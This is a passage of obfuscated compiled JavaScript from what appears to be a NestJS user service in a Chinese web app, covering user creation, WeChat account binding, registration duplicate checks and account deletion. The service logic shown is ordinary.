this[_0x27905b(0x10c)]['getConfigs']([_0x27905b(0x12f)]),_0x1d2b84={'avatar':_0xa03bd5,'username':'用户'+(0x0,utils_1['createRandomUid'])(),'status':user_constant_1[_0x27905b(0x131)][_0x27905b(0x181)],'sex':0x0,'email':(0x0,utils_1[_0x27905b(0x127)])()+_0x27905b(0x161),'invitedBy':_0xf8e3f2,'openId':_0x2a14ae};return await this[_0x27905b(0x154)]['save'](_0x1d2b84);}async[_0x897b27(0x121)](_0x834bbc,_0x4511a4){const _0x5d1f6e=_0x897b27;try{const _0x2e9f84=await this[_0x5d1f6e(0x154)][_0x5d1f6e(0xfa)]({'where':{'id':_0x4511a4}});if(!_0x2e9f84)return{'status':![],'msg':_0x5d1f6e(0x140)};const _0x56115b=await this[_0x5d1f6e(0x154)][_0x5d1f6e(0xfa)]({'where':{'openId':_0x834bbc}});if(_0x56115b)return{'status':![],'msg':_0x5d1f6e(0x15a)};const _0x11a820=await this[_0x5d1f6e(0x154)][_0x5d1f6e(0xed)]({'id':_0x4511a4},{'openId':_0x834bbc});if(_0x11a820[_0x5d1f6e(0x117)]<=0x0)return{'status':![],'msg':'绑定微信失败、请联系管理员！'};return{'status':!![],'msg':_0x5d1f6e(0x139)};}catch(_0x1af0d1){return{'status':![],'msg':_0x5d1f6e(0x105)};}}async[_0x897b27(0x146)](_0x36c9a6){const _0x5bede6=_0x897b27,_0x2552b3=await this[_0x5bede6(0x154)][_0x5bede6(0xfa)]({'where':{'id':_0x36c9a6}});return _0x2552b3?.[_0x5bede6(0x13d)];}async[_0x897b27(0xf6)](_0x5b1ebb){const _0xe4b9cf=_0x897b27,_0x23b709=await this[_0xe4b9cf(0x154)][_0xe4b9cf(0xfa)]({'where':{'id':_0x5b1ebb}});return _0x23b709?.[_0xe4b9cf(0x14f)];}async[_0x897b27(0x187)](_0x20f1a0){const _0x211123=_0x897b27,{username:_0x144970,password:_0x36fc22,phone:_0x288cd1,phoneCode:_0x25b2b1}=_0x20f1a0,_0x223f09=await this[_0x211123(0x154)][_0x211123(0xfa)]({'where':[{'username':_0x144970},{'phone':_0x288cd1}]});if(_0x223f09&&_0x223f09['username']===_0x144970)throw new common_1[(_0x211123(0x100))](_0x211123(0xfd),common_1['HttpStatus'][_0x211123(0x10f)]);if(_0x223f09&&_0x223f09[_0x211123(0x183)]===_0x288cd1)throw new common_1[(_0x211123(0x100))](_0x211123(0x14a),common_1[_0x211123(0x17e)]['BAD_REQUEST']);}async[_0x897b27(0x107)](_0x31977e){const _0x2bfc65=_0x897b27;return await this[_0x2bfc65(0x154)][_0x2bfc65(0x116)](_0x31977e);}async['delUser'](_0xf3cb75){const _0x4233ee=_0x897b27,{id:_0x268500,moreId:_0xbec321}=_0xf3cb75;if(_0x268500)return await this[_0x4233ee(0x154)][_0x4233ee(0x177)]({'id':_0x268500});if(_0xbec321)return await this['userEntity']['delete']({'id':(0x0,typeorm_2[_0x4233ee(0x173)])(_0xbec321)});}async['destroyAccount'](_0x4b43dd){const _0x47b812=_0x897b27,_0x589681=_0x4b43dd[_0x47b812(0x10a)]['id'];return await this[_0x47b812(0x154)]['delete']({'id':_0x589681})['then'](_0x2f44d1=>_0x2f44d1[_0x47b812(0x117)]>0x0);}};UserService=__decorate([(0x0,common_1[_0x897b27(0x112)])(),__param(0x0,(0x0,typeorm_1[_0x897b27(0x12c)])(user_entity_1[_0x897b27(0x149)])),__param(0x1,(0x0,typeorm_1[_0x897b27(0x12c)])(whiteList_entity_1[_0x897b27(0x10b)])),__param(0x7,(0x0,typeorm_1[_0x897b27(0x12c)])(config_entity_1[_0x897b27(0x12d)])),__metadata('design:paramtypes',[typeorm_2[_0x897b27(0x17f)],typeorm_2[_0x897b27(0x17f)],typeorm_2['Connection'],verification_service_1['VerificationService'],mailer_1[_0x897b27(0x188)],userBalance_service_1[_0x897b27(0x162)],globalConfig_service_1[_0x897b27(0x145)],typeorm_2['Repository']])],UserService),exports['UserService']=UserService;